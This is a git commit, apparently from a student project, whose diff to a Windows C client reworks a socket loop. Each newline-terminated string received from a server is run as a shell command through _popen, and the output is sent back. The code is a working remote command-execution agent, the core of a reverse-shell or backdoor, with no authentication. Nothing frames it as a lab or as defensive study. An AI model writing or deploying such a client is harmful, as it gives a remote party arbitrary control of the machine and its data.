bd325929b5a5287754e7cdc2598473f8713566ee
Scott Fitzgerald <john.fitzgerald@epitech.eu>
2026-02-04 02:18:48 +0100

    refactor: handle dead connections + fully handle sticky packets by extracting and executing all commands before next recv()

--- client.c
+++ client.c
@@ -40,46 +40,53 @@ int main() {
   char recv_buffer[1024];
   int recv_len = 0;
 
+  char cmd[1024];
+
   while (1) {
-    char cmd[1024];
-    char *newline;
 
-    // Processes one command per loop iteration
-    while ((newline = memchr(recv_buffer, '\n', recv_len)) == NULL) {
-      // Receive bytes from socket and append them to recv_buffer
-      int n = recv(sock, recv_buffer + recv_len, sizeof(recv_buffer) - 1 - recv_len, 0);
+    int n = recv(sock, recv_buffer + recv_len, sizeof(recv_buffer) - 1 - recv_len, 0);
 
-      if (n > 0) {
-          recv_len += n;
+
+    if (n > 0) {
+
+      recv_len += n;
+      char *newline;
+
+      while ((newline = memchr(recv_buffer, '\n', recv_len)) != NULL) {
+        int cmd_len = newline - recv_buffer;
+
+        // Copy command i.e. bytes up to \n delimiter from recv_buffer into cmd buffer
+        memcpy(cmd, recv_buffer, cmd_len);
+        // Append `\0` to make it a string
+        cmd[cmd_len] = '\0';
+
+        printf("Received from server: %s", cmd);
+
+        // Move remaining bytes back to the start of recv_buffer
+        memmove(recv_buffer, recv_buffer + cmd_len + 1, recv_len - (cmd_len + 1));
+        recv_len = recv_len - (cmd_len + 1);
+        
+
+
+        // Perform received command
+        FILE *fp = _popen(cmd, "r");
+
+        char output[4096];
+        size_t len = fread(output, 1, sizeof(output)-1, fp);
+
+        output[len] = '\0';
+        _pclose(fp);
+
+        printf("OUTPUT: %s", output);
+
+        send(sock, output, strlen(output), 0);
+
       }
+
+    } else {
+        closesocket(sock);
+        WSACleanup();
+        break;
     }
-
-    int cmd_len = newline - recv_buffer;
-
-    // Copy command i.e. bytes up to \n delimiter from recv_buffer into cmd buffer
-    memcpy(cmd, recv_buffer, cmd_len);
-    // Append `\0` to make it a string
-    cmd[cmd_len] = '\0';
-
-    printf("Received from server: %s", cmd);
-
-    // Move remaining bytes back to the start of recv_buffer
-    memmove(recv_buffer, recv_buffer + cmd_len + 1, recv_len - cmd_len);
-    recv_len = recv_len - (cmd_len + 1);
-    
-
-
-    // Perform received command
-    FILE *fp = _popen(cmd, "r");
-
-    char output[4096];
-    size_t len = fread(output, 1, sizeof(output)-1, fp);
-
-    output[len] = '\0';
-    _pclose(fp);
-
-    printf("OUTPUT: %s", output);
-
-    send(sock, output, strlen(output), 0);
   }
 }
